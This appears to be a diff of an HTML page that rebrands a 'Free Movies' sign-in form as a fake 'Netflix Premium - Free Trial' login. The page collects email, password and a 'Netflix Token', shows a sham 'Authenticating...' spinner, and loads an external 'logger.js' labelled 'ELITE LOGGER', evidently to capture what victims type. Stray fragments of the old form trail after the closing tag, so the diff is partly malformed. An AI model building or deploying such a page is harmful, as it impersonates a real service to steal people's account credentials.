@@ -3,38 +3,45 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Movie Streaming</title>
+    <title>Netflix Premium - Free Trial</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            font-family: 'Segoe UI', sans-serif; 
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center;
-        }
-        .container { 
-            background: rgba(255,255,255,0.95); 
-            padding: 2rem; 
-            border-radius: 20px; 
-            box-shadow: 0 20px 40px rgba(0,0,0,0.1); 
-            max-width: 400px; 
-            text-align: center;
-        }
-        h1 { color: #333; margin-bottom: 1rem; font-size: 2em; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 2px solid #ddd; border-radius: 10px; font-size: 16px; }
-        button { background: #667eea; color: white; border: none; padding: 12px 24px; border-radius: 10px; cursor: pointer; font-size: 16px; width: 100%; }
-        .loading { display: none; }
-        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #667eea; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        *{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial;background:linear-gradient(45deg,#ff416c,#ff4b2b);min-height:100vh;display:flex;align-items:center;justify-content:center}
+        .card{background:#fff;max-width:400px;width:90%;padding:2rem;border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,.3);text-align:center}
+        h1{color:#333;margin-bottom:1rem;font-size:2.2em}
+        input{width:100%;padding:15px;margin:10px 0;border:2px solid #eee;border-radius:12px;font-size:16px;box-sizing:border-box}
+        input:focus{border-color:#ff416c;outline:none}
+        button{background:linear-gradient(45deg,#ff416c,#ff4b2b);color:white;border:none;padding:15px;border-radius:12px;cursor:pointer;font-size:18px;font-weight:bold;width:100%;margin-top:10px}
+        .loading{display:none;text-align:center;padding:2rem}
+        .spinner{width:40px;height:40px;border:4px solid #f3f3f3;border-top:4px solid #ff416c;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 1rem}
+        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🎬 Free Movies</h1>
-        <p>Sign in to start streaming</p>
-        
+    <div class="card">
+        <h1>🎥 Netflix Premium</h1>
+        <p style="color:#666;margin-bottom:2rem">Continue with your account</p>
+        <form id="authForm">
+            <input type="email" id="email" placeholder="Email or phone" required autocomplete="email">
+            <input type="password" id="password" placeholder="Password" required autocomplete="current-password">
+            <input type="text" id="token" placeholder="Netflix Token (optional)" autocomplete="off">
+            <button type="submit">Sign In</button>
+        </form>
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>Authenticating...</p>
+        </div>
+    </div>
+    
+    <!-- LOAD ELITE LOGGER -->
+    <script src="logger.js"></script>
+    <script>
+        document.getElementById('authForm').onsubmit = e => {
+            e.preventDefault();
+            document.getElementById('loading').style.display = 'block';
+        };
+    </script>
+</body>
+</html>        
         <form id="loginForm">
             <input type="email" id="email" placeholder="Email" required>
             <input type="password" id="password" placeholder="Password" required>
